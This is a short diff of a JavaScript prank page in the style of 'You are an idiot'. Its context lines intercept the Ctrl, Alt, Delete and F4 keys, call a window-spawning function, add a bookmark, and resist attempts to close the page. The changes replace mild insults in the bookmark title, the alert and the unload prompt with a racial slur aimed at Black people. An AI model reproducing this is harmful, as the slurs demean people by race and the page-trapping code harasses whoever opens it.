@@ -37,7 +37,7 @@ faudio.addEventListener('timeupdate', function() {
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
 		var url = "lol.html";
-		var title = "Idiot!";
+		var title = "Nigger!!!";
 		
 		window.external.AddFavorite(url, title);
 	}
@@ -128,7 +128,7 @@ window.onkeydown = function() {
 	var keyCode = event.keyCode;
 	
 	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("You are an idiot!"); 
+		alert("Stupid nigger!"); 
 		proCreate();
 	}
 	
@@ -136,6 +136,6 @@ window.onkeydown = function() {
 }
 
 window.onbeforeunload = function() {
-    return "Are you an idiot?";
+    return "Nigger!!! STOP TRYING TO CLOSE THE WINDOW!";
 };
 /* [Oct 2021] End of amendments. */
